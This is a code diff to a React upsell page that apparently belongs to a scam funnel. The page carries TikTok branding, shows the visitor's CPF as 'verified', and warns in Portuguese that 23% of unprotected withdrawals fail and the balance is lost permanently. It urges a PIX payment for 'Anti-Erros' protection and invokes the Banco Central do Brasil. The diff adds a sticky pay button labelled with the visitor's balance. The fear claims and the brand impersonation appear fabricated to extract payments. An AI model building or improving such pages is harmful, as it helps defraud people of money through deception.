@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import { Loader2, AlertTriangle, Shield, CheckCircle2, Lock, Zap, ChevronRight } from "lucide-react";
+import StickyCtaBar from "./StickyCtaBar";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
@@ -15,7 +16,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
   return (
     <div className="fixed inset-0 z-[80] bg-white overflow-y-auto">
       <div className="bg-[#FE2C55] py-2.5 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
-      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
+      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-24">
         {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
         <div className="bg-red-50 border border-red-200 rounded-xl p-3"><div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⚠️ Risco de Falha no Saque</span></div><p className="text-gray-600 text-xs leading-relaxed">O sistema detectou que <strong className="text-gray-900">23% dos saques sem proteção Anti-Erros falham</strong> por inconsistências entre CPF, chave PIX e dados bancários. Quando isso acontece, <strong className="text-red-600">o valor é devolvido ao remetente e o saldo é cancelado permanentemente</strong>.</p></div>
         <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
@@ -39,6 +40,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
         <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>ATIVAR PROTEÇÃO TOTAL<ChevronRight className="w-4 h-4" /></>)}</button>
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
       </main>
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"PROTEGER MEU SAQUE DE " + balance} bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
     </div>
   );
 };
